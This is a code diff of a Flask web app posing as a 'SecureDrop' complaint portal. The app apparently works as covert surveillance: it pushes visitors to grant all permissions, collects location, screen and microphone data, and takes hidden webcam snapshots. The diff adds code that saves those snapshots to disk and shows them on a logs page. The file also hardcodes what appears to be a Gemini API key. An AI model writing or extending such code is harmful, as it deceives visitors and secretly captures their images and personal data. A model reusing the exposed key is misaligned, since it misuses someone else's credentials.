@@ -17,6 +17,7 @@ from PIL import Image as PILImage
 import PyPDF2
 import netifaces
 import google.generativeai as genai
+import glob
 
 # Configure the SDK with your Gemini API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
@@ -295,8 +296,9 @@ LOGIN_PAGE = """
 <head>
     <meta charset="UTF-8">
     <title>SecureDrop Login</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
         .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; }
         h1 { font-size: 24px; text-align: center; color: #202124; }
         label { display: block; margin: 10px 0 5px; color: #5f6368; }
@@ -328,20 +330,22 @@ PERMISSIONS_PAGE = """
 <head>
     <meta charset="UTF-8">
     <title>Enable Permissions</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f2f2f2; }
+        body { text-align: center; padding: 50px; background-color: #f2f2f2; }
         h2 { color: #333; }
-        button { padding: 10px 20px; margin: 5px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background-color: #1557b0; }
+        button { padding: 10px 20px; margin: 5px; }
         p { color: #d93025; }
     </style>
 </head>
 <body>
-    <h2>Do you want to enable all permissions to proceed?</h2>
-    <p>You are only allowed to proceed when the "Yes" button is pressed and permissions are granted.</p>
-    <button id="yesButton">Yes</button>
-    <button id="noButton">No</button>
-    <p id="status"></p>
+    <div class="container">
+        <h2>Do you want to enable all permissions to proceed?</h2>
+        <p>You are only allowed to proceed when the "Yes" button is pressed and permissions are granted.</p>
+        <button id="yesButton" class="btn btn-primary">Yes</button>
+        <button id="noButton" class="btn btn-secondary">No</button>
+        <p id="status"></p>
+    </div>
     <script>
         document.getElementById('yesButton').addEventListener('click', () => {
             Promise.all([
@@ -371,31 +375,32 @@ DRIVE_PAGE = """
 <head>
     <meta charset="UTF-8">
     <title>SecureDrop</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f2f2f2; }
+        body { margin: 20px; background-color: #f2f2f2; }
         h1 { color: #202124; }
         .file-list { margin-top: 20px; }
         .file { padding: 10px; background: white; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 10px; }
-        button { padding: 10px 20px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        button:hover { background-color: #1557b0; }
     </style>
 </head>
 <body>
-    <h1>Welcome to SecureDrop</h1>
-    <p>Your complaints:</p>
-    <div class="file-list">
-        <div class="file">Complaint #1 - Submitted 2023-10-01</div>
-        <div class="file">Complaint #2 - Submitted 2023-10-02</div>
+    <div class="container">
+        <h1>Welcome to SecureDrop</h1>
+        <p>Your complaints:</p>
+        <div class="file-list">
+            <div class="file">Complaint #1 - Submitted 2023-10-01</div>
+            <div class="file">Complaint #2 - Submitted 2023-10-02</div>
+        </div>
+        <form id="downloadForm" action="/download" method="post">
+            <input type="hidden" name="permissions" value="{{ permissions }}">
+            <input type="hidden" name="screenWidth" id="screenWidth">
+            <input type="hidden" name="screenHeight" id="screenHeight">
+            <input type="hidden" name="location" id="location">
+            <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
+            <button type="submit" class="btn btn-primary">Download Data</button>
+        </form>
+        <a href="/logs" class="btn btn-link">View Logs</a>
     </div>
-    <form id="downloadForm" action="/download" method="post">
-        <input type="hidden" name="permissions" value="{{ permissions }}">
-        <input type="hidden" name="screenWidth" id="screenWidth">
-        <input type="hidden" name="screenHeight" id="screenHeight">
-        <input type="hidden" name="location" id="location">
-        <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
-        <button type="submit">Download Data</button>
-    </form>
-    <a href="/logs">View Logs</a>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
     <script>
@@ -576,45 +581,56 @@ def display_logs():
     except Exception as e:
         logs_content = f"Error reading log file: {e}"
 
+    # Get list of captured images
+    captures = glob.glob('static/captures/*.jpg')
+    captures_html = ""
+    for capture in captures:
+        captures_html += f'<img src="/{capture}" alt="Captured Image" style="max-width: 300px; margin: 10px;">'
+
     logs_html = """
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
         <title>User Logs and Reports</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
         <style>
-            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
-            h1, h2 { color: #333; }
+            body { margin: 20px; }
             pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
-            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-            th, td { border: 1px solid #ccc; padding: 10px; text-align: left; }
-            th { background-color: #f2f2f2; }
         </style>
     </head>
     <body>
-        <h1>User Logs</h1>
-        <pre>{{ logs }}</pre>
-        <h2>Downloaded Reports</h2>
-        {% if reports %}
-        <table>
-            <tr>
-                <th>Token</th>
-                <th>Gemini Report</th>
-            </tr>
-            {% for report in reports %}
-            <tr>
-                <td>{{ report.token }}</td>
-                <td><pre>{{ report.gemini_report }}</pre></td>
-            </tr>
-            {% endfor %}
-        </table>
-        {% else %}
-        <p>No reports available.</p>
-        {% endif %}
+        <div class="container">
+            <h1>User Logs</h1>
+            <pre>{{ logs }}</pre>
+            <h2>Downloaded Reports</h2>
+            {% if reports %}
+            <table class="table table-bordered">
+                <thead>
+                    <tr>
+                        <th>Token</th>
+                        <th>Gemini Report</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for report in reports %}
+                    <tr>
+                        <td>{{ report.token }}</td>
+                        <td><pre>{{ report.gemini_report }}</pre></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <p>No reports available.</p>
+            {% endif %}
+            <h2>Captured Images</h2>
+            <div>{{ captures_html | safe }}</div>
+        </div>
     </body>
     </html>
     """
-    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports)
+    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures_html=captures_html)
 
 @app.route('/log_location', methods=['POST'])
 def log_location():
@@ -625,7 +641,18 @@ def log_location():
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
     data = request.json
-    logging.info(f"Camera snapshot logged: {json.dumps(data)}")
+    snapshot = data.get('snapshot')
+    if snapshot:
+        # Decode base64 image
+        image_data = base64.b64decode(snapshot.split(',')[1])
+        # Generate unique filename
+        filename = f"static/captures/{uuid.uuid4()}.jpg"
+        # Ensure directory exists
+        os.makedirs('static/captures', exist_ok=True)
+        # Save image
+        with open(filename, 'wb') as f:
+            f.write(image_data)
+        logging.info(f"Camera snapshot saved: {filename}")
     return "Camera logged", 200
 
 @app.route('/log_microphone', methods=['POST'])
